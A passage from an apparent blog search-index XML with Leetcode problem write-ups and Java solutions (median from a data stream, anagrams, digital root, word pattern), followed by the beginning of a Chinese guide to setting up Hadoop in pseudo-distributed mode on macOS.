class="keyword">if</span> i <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">return</span> [index, result[i]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result[target-i] = index</span><br><span class="line">            index += <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[295. Find Median from Data Stream]]></title>
      <url>/wiki/2017/10/10/Leetcode-295-Find-Median-from-Data-Stream/</url>
      <content type="html"><![CDATA[<p>Median is the middle value in an ordered integer list. If the size of the list is even, there is no middle value. So the median is the mean of the two middle value.</p>
<p>For example,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[2,3,4], the median is 3</span><br><span class="line"></span><br><span class="line">[2,3], the median is (2 + 3) / 2 = 2.5</span><br></pre></td></tr></table></figure>
<p>Design a data structure that supports the following two operations:</p>
<ul>
<li><code>void addNum(int num)</code> - Add an integer number from the data stream to the data structure.</li>
<li><code>double findMedian()</code> - Return the median of all elements so far.</li>
</ul>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addNum(1)</span><br><span class="line">addNum(2)</span><br><span class="line">findMedian() -&gt; 1.5</span><br><span class="line">addNum(3) </span><br><span class="line">findMedian() -&gt; 2</span><br></pre></td></tr></table></figure>
<p>Follow up:</p>
<ol>
<li>If all integer numbers from the stream are between 0 and 100, how would you optimize it?</li>
<li>If 99% of all integer numbers from the stream are between 0 and 100, how would you optimize it?</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>分析详见<a href="http://larryim.cc/note-os/algorithm/algorithmStanford/heap/#application-median-maintenance">斯坦福算法课程笔记</a>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MedianFinder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> PriorityQueue&lt;Integer&gt; minHeap;</span><br><span class="line">    <span class="keyword">private</span> PriorityQueue&lt;Integer&gt; maxHeap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MedianFinder</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        minHeap = <span class="keyword">new</span> PriorityQueue&lt;&gt;();</span><br><span class="line">        maxHeap = <span class="keyword">new</span> PriorityQueue&lt;&gt;(Collections.reverseOrder());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addNum</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (maxHeap.peek() == <span class="keyword">null</span> || maxHeap.peek() &gt; num) maxHeap.offer(num);</span><br><span class="line">        <span class="keyword">else</span> minHeap.add(num);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (maxHeap.size() + <span class="number">1</span> &lt; minHeap.size())</span><br><span class="line">            maxHeap.offer(minHeap.poll());</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (minHeap.size() + <span class="number">1</span> &lt; maxHeap.size())</span><br><span class="line">            minHeap.offer(maxHeap.poll());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">findMedian</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (maxHeap.size() == minHeap.size())</span><br><span class="line">            <span class="keyword">return</span> (maxHeap.peek() + minHeap.peek()) / <span class="number">2.0</span>;</span><br><span class="line">        <span class="keyword">if</span> (maxHeap.size() &gt; minHeap.size())</span><br><span class="line">            <span class="keyword">return</span>  maxHeap.peek();</span><br><span class="line">        <span class="keyword">return</span> minHeap.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Design </tag>
            
            <tag> Heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[242. Valid Anagram]]></title>
      <url>/wiki/2017/10/10/Leetcode-242-Valid-Anagram/</url>
      <content type="html"><![CDATA[<p>Given two strings $s$ and $t$ , write a function to determine if $t$ is an anagram of $s$.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;anagram&quot;, t = &quot;nagaram&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;rat&quot;, t = &quot;car&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>: You may assume the string contains only lowercase alphabets.</p>
<p><strong>Follow up</strong>: What if the inputs contain unicode characters? How would you adapt your solution to such case?</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>确认错位词。可以使用两种方法，都非常简单</p>
<ol>
<li>将字符串中的字符排序，然后一一比较字符是否相等</li>
<li>将字符串中的字符放到哈希表中分类计数，其中一个+1，另一个-1，最后都要等于0</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAnagram</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length() != t.length()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">char</span>[] sChar = s.toCharArray(), tChar = t.toCharArray();</span><br><span class="line">    Arrays.sort(sChar);</span><br><span class="line">    Arrays.sort(tChar);</span><br><span class="line">    <span class="keyword">return</span> Arrays.equals(sChar, tChar);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用哈希表分类计数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAnagram</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length() != t.length()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 一共只有26个字母</span></span><br><span class="line">    <span class="keyword">int</span>[] count = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        count[s.charAt(i) - <span class="string">'a'</span>]++;</span><br><span class="line">        count[t.charAt(i) - <span class="string">'a'</span>]--;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : count)</span><br><span class="line">        <span class="keyword">if</span> (num != <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Sort </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[258. Add Digits]]></title>
      <url>/wiki/2017/10/10/Leetcode-258-Add-Digits/</url>
      <content type="html"><![CDATA[<p>Given a non-negative integer <code>num</code>, repeatedly add all its digits until the result has only one digit.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: 38</span><br><span class="line">Output: 2 </span><br><span class="line">Explanation: The process is like: 3 + 8 = 11, 1 + 1 = 2. </span><br><span class="line">             Since 2 has only one digit, return it.</span><br></pre></td></tr></table></figure>
<p>Follow up:</p>
<ul>
<li>Could you do it without any loop/recursion in $O(1)$ runtime?</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目考查的是对于数字的基本操作。每次从数字中取出最低一位，累加的总和不能超过10.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">addDigits</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> digit = <span class="number">0</span>, n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (num &gt; <span class="number">9</span>) &#123;</span><br><span class="line">        n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            digit = num % <span class="number">10</span>;</span><br><span class="line">            n += digit;</span><br><span class="line">            num /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        num = n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但follow up 里又说了： 你能不使用任何循环/递归在$O(1)$ 时间内解决吗？实际上这是一个有名的<strong>数根</strong>问题，解决这个问题有一个[Congruence formula](</p>
<p>$$ \operatorname{dr}(n) = \begin{cases}0 &amp; \mbox{if}\ n = 0, \ 9 &amp; \mbox{if}\ n \neq 0,\ n\ \equiv 0\pmod{9},\ n\ {\rm mod}\ 9 &amp; \mbox{if}\ n \not\equiv 0\pmod{9}\end{cases}<br>$$</p>
<p>$$\text{或者:} \mbox{dr}(n) = 1\ +\ ((n-1)\ {\rm mod}\ 9)$$</p>
<p>为了了解这个公式我们先来观察1到20的所有的树根：</p>
<pre><small>
1    1
2    2
3    3
4    4
5    5
6    6
7    7
8    8    
9    9    
10    1
11    2
12    3    
13    4
14    5
15    6
16    7
17    8
18    9
19    1
20    2
</small></pre>

<p>根据上面的列举，我们可以得出规律，每9个一循环，所有大于9的数的树根都是对9取余，那么对于等于9的数对9取余就是0了，为了得到其本身，而且同样也要对大于9的数适用，就用$(n-1)%9+1$这个表达式来包括所有的情况。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addDigits</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (num - <span class="number">1</span>) % <span class="number">9</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[290. Word Pattern]]></title>
      <url>/wiki/2017/10/10/Leetcode-290-Word-Pattern/</url>
      <content type="html"><![CDATA[<p>Given a <code>pattern</code> and a string <code>str</code>, find if <code>str</code> follows the same pattern.</p>
<p>Here <strong>follow</strong> means a full match, such that there is a bijection between a letter in <code>pattern</code> and <strong>a non-empty</strong> word in <code>str</code>.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: pattern = &quot;abba&quot;, str = &quot;dog cat cat dog&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input:pattern = &quot;abba&quot;, str = &quot;dog cat cat fish&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: pattern = &quot;aaaa&quot;, str = &quot;dog cat cat dog&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<p>Example 4:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: pattern = &quot;abba&quot;, str = &quot;dog dog dog dog&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<p>Notes:<br>You may assume <code>pattern</code> contains only lowercase letters, and <code>str</code> contains lowercase letters separated by a single space.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目是LeetCode 205. Isomorphic Strings的扩展。在Q205中，字符和字符存在一一对应关系。这里字符和字符串存在一一对应关系。但是它们的实质是相同的。在Q205中，有两种方法来解决问题；在这道题目中这两种方法仍旧适用，只需要稍微改编一下即可。</p>
<p>方法1， 使用哈希表来存储<code>pattern</code>和<code>str</code>的一一对应关系。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">wordPattern</span><span class="params">(String pattern, String str)</span> </span>&#123;</span><br><span class="line">    String[] strs = str.trim().split(<span class="string">"\\s+"</span>);</span><br><span class="line">    <span class="keyword">if</span> (pattern.length() != strs.length) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    </span><br><span class="line">    Map&lt;Character, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    Set&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pattern.length(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(pattern.charAt(i))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!map.get(pattern.charAt(i)).equals(strs[i])) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!set.add(strs[i])) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            map.put(pattern.charAt(i), strs[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>方法2， 存储下标</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">wordPattern</span><span class="params">(String pattern, String str)</span> </span>&#123;</span><br><span class="line">    String[] words = str.split(<span class="string">" "</span>);</span><br><span class="line">    <span class="keyword">if</span> (words.length != pattern.length())</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    Map index = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="keyword">for</span> (Integer i = <span class="number">0</span>; i&lt;words.length; ++i)</span><br><span class="line">        <span class="keyword">if</span> (index.put(pattern.charAt(i), i) != index.put(words[i], i))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码中Map缺失了Generics, 但是可以把两种类型的数据(Character, String)都放进去。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mac环境下搭建Hadoop家族产品]]></title>
      <url>/wiki/2017/09/30/awesome-Install-Mac%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%90%AD%E5%BB%BAHadoop%E5%AE%B6%E6%97%8F%E4%BA%A7%E5%93%81/</url>
      <content type="html"><![CDATA[<h2 id="1-安装Hadoop"><a href="#1-安装Hadoop" class="headerlink" title="1. 安装Hadoop"></a>1. 安装Hadoop</h2><p>上面步骤和条件如果都具备的话，就可以安装Hadoop了。Hadoop有三种运行模式：<strong>单机模式</strong>，<strong>伪分布式模式</strong>，<strong>分布式模式</strong>，这里设置的是伪分布式模式。</p>
<h3 id="0-Java-SDK"><a href="#0-Java-SDK" class="headerlink" title="0 Java SDK"></a>0 Java SDK</h3><p>在所有安装前，确认已经安装了JAVA JDK，并设置了JAVA_HOME。这里推荐使用HomeBrew安装JDK，因为HomeBrew可以非常方便的管理多个版本[<a href="https://stackoverflow.com/questions/26252591/mac-os-x-and-multiple-java-versions">Mac OS X and multiple Java versions</a>]。</p>
<ul>
<li>homebrew-cask 安装多个java版本</li>
<li>jenv 管理多个java版本</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. Install jenv</span></span><br><span class="line">brew install jenv</span><br><span class="line"><span class="comment"># 2. Add jenv to the bash profile</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">which</span> jenv &gt; /dev/null; <span class="keyword">then</span> <span class="built_in">eval</span> <span class="string">"<span class="variable">$(jenv init -)</span>"</span>; <span class="keyword">fi</span></span><br><span class="line"><span class="comment"># 3. Add jenv to your path</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">"<span class="variable">$HOME</span>/.jenv/shims:<span class="variable">$PATH</span>"</span></span><br><span class="line"><span class="comment"># 4. Tap "caskroom/versions"</span></span><br><span class="line">brew tap caskroom/versions</span><br><span class="line"><span class="comment"># 5. Install the latest version of java</span></span><br><span class="line">brew cask install java</span><br><span class="line"><span class="comment"># 6. Install java 7 or 8 (whatever you need)</span></span><br><span class="line">brew cask install java6</span><br><span class="line"><span class="comment">#brew cask install java7</span></span><br><span class="line"><span class="comment">#brew cask install java8</span></span><br><span class="line"><span class="comment"># 7. Add each path to jenv one-at-a-time.</span></span><br><span class="line">jenv add /Library/Java/JavaVirtualMachines/jdk-10.0.2.jdk/Contents/Home</span><br><span class="line"><span class="comment"># 8. Check if jenv registered OK</span></span><br><span class="line">jenv versions</span><br><span class="line"><span class="comment"># 9. Set java version to use (globaly)</span></span><br><span class="line">jenv global 10.0</span><br><span class="line"><span class="comment"># 10. Check java version</span></span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>
<h3 id="1-1-配置ssh"><a href="#1-1-配置ssh" class="headerlink" title="1.1 配置ssh"></a>1.1 配置ssh</h3><p>配置ssh就是为了能够实现Hadoop的免密登录，这样方便远程管理Hadoop并无需登录密码在Hadoop集群上共享文件资源。如果你的机子没有配置ssh的话，在命令终端输入<code>ssh localhost</code>是需要输入你的电脑登录密码的。配置好ssh后，就无需输入密码了。</p>
<ul>
<li><p>第一步就是在终端执行<code>ssh-keygen -t rsa</code>，之后一路<code>enter</code>键，当然如果你之前已经执行过这样的语句，那过程中会提示是否要覆盖原有的key，输入y即可。</p>
</li>
<li><p>第二步执行语句<code>cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</code>用于授权你的公钥到本地可以无需密码实现登录。</p>
</li>
</ul>
<p>理论上这时候，你在终端输入<code>ssh localhost</code>就能够免密登录了。</p>
<h3 id="1-2-下载安装Hadoop"><a href="#1-2-下载安装Hadoop" class="headerlink" title="1.2 下载安装Hadoop"></a>1.2 下载安装Hadoop</h3><p>这时候brew的好处就体现出来了，你无需到Hadoop官网去找下载链接，只要在命令终端输入<code>brew install hadoop</code>等命令执行完，你就可以看到在<code>/usr/lcoal/Cellar</code>目录下就有了hadoop目录，表示安装成功。</p>
<h3 id="1-3-配置Hadoop"><a href="#1-3-配置Hadoop" class="headerlink" title="1.3 配置Hadoop"></a>1.3 配置Hadoop</h3><h4 id="1-3-1-配置HDFS地址和端口号"><a href="#1-3-1-配置HDFS地址和端口号" class="headerlink" title="1.3.1 配置HDFS地址和端口号"></a>1.3.1 配置HDFS地址和端口号</h4><p>进入目录<code>/usr/local/Cellar/hadoop/3.1.0/libexec/etc/hadoop</code>，打开<code>core-site.xml</code>将<code>&lt;configuration&gt;&lt;/configuration&gt;</code>替换为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">     &lt;name&gt;hadoop.tmp.dir&lt;/name&gt;  </span><br><span class="line">     &lt;value&gt;/usr/local/Cellar/hadoop/hdfs/tmp&lt;/value&gt;</span><br><span class="line">    &lt;description&gt;A base for other temporary directories.&lt;/description&gt;</span><br><span class="line">  &lt;/property&gt;</span><br><span class="line">  &lt;property&gt;</span><br><span class="line">     &lt;name&gt;fs.default.name&lt;/name&gt;                                     </span><br><span class="line">     &lt;value&gt;hdfs://localhost:9000&lt;/value&gt;                             </span><br><span class="line">  &lt;/property&gt;                                                       </span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
<h4 id="1-3-2-配置mapreduce中jobtracker的地址和端口"><a href="#1-3-2-配置mapreduce中jobtracker的地址和端口" class="headerlink" title="1.3.2 配置mapreduce中jobtracker的地址和端口"></a>1.3.2 配置mapreduce中<code>jobtracker</code>的地址和端口</h4><p>在相同的目录下，你可以看到一个<code>mapred-site.xml</code>文件。同样将文件中的<code>&lt;configuration&gt;&lt;/configuration&gt;</code>替换为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">      &lt;property&gt;</span><br><span class="line">        &lt;name&gt;mapred.job.tracker&lt;/name&gt;</span><br><span class="line">        &lt;value&gt;localhost:9010&lt;/value&gt;</span><br><span class="line">      &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
<h4 id="1-3-3-修改hdfs备份数"><a href="#1-3-3-修改hdfs备份数" class="headerlink" title="1.3.3 修改hdfs备份数"></a>1.3.3 修改hdfs备份数</h4><p>在相同目录下，打开<code>hdfs-site.xml</code>，同样的替换为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">   &lt;property&gt;</span><br><span class="line">     &lt;name&gt;dfs.replication&lt;/name&gt;</span><br><span class="line">     &lt;value&gt;1&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
<p>变量<code>dfs.replication</code>指定了每个HDFS默认备份方式通常为3, 由于我们只有一台主机和一个伪分布式模式的DataNode，将此值修改为1。</p>
<h4 id="1-3-4-格式化HDFS"><a href="#1-3-4-格式化HDFS" class="headerlink" title="1.3.4 格式化HDFS"></a>1.3.4 格式化HDFS</h4><p>这个操作相当于一个文件系统的初始化，执行命令<code>hdfs namenode -format</code>。 出现提示输入Y/N时要输入大写Y。</p>
<h3 id="1-4-配置Hadoop环境变量"><a href="#1-4-配置Hadoop环境变量" class="headerlink" title="1.4 配置Hadoop环境变量"></a>1.4 配置Hadoop环境变量</h3><p>因为我用的是iTerm2和zsh，所以打开<code>~/.zshrc</code>添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export HADOOP_HOME=/usr/local/Cellar/hadoop/3.1.0/</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin</span><br></pre></td></tr></table></figure>
<p>再执行<code>source ~/.zshrc</code>以确保配置生效。配置的目的是方便在任意目录下全局开启关闭hadoop相关服务，而不需要到<code>/usr/local/Cellar/hadoop/3.0.0/sbin下执行</code>。</p>
<h3 id="1-5-启动-关闭Hadoop服务"><a href="#1-5-启动-关闭Hadoop服务" class="headerlink" title="1.5 启动/关闭Hadoop服务"></a>1.5 启动/关闭Hadoop服务</h3><p>启动/关闭HDFS服务的命令为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./start-dfs.sh          </span><br><span class="line">./stop-dfs.sh</span><br></pre></td></tr></table></figure>
<p>启动/关闭YARN服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./start-yarn.sh        </span><br><span class="line">./stop-yarn.sh</span><br></pre></td></tr></table></figure>
<p>启动/关闭Hadoop服务(等效上面两个)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./start-all.sh   </span><br><span class="line">./stop-all.sh</span><br></pre></td></tr></table></figure>
<p>通过访问以下网址查看hadoop是否启动成功</p>
<ul>
<li>Node Information: <a href="http://localhost:9870">http://localhost:9870</a></li>
<li>Resource Manager: <a href="http://localhost:8088">http://localhost:8088</a></li>
<li>NodeManager : <a href="http://localhost:8042">http://localhost:8042</a></li>
</ul>
<p>这里要注意的是在3.1.0版本中<a href="http://localhost:50070">http://localhost:50070</a>转移到了<a href="http://localhost:9870">http://localhost:9870</a>.</p>
<h3 id="1-6-配置yarn"><a href="#1-6-配置yarn" class="headerlink" title="1.6 配置yarn"></a>1.6 配置yarn</h3><p>etc/hadoop/mapred-site.xml:</p>
